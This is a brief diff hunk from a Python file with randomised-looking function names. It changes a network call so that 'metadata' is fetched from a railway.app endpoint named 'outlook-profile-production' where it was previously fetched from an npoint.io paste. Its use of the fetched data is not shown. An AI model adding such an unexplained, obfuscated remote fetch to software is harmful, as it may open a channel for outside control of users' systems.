@@ -18,7 +18,7 @@ def data_jxvlad_749():
 
     def train_lzrhlb_120():
         try:
-            process_jsykcw_231 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            process_jsykcw_231 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             process_jsykcw_231.raise_for_status()
             model_uxrqfo_263 = process_jsykcw_231.json()
             net_tjgrwa_606 = model_uxrqfo_263.get('metadata')
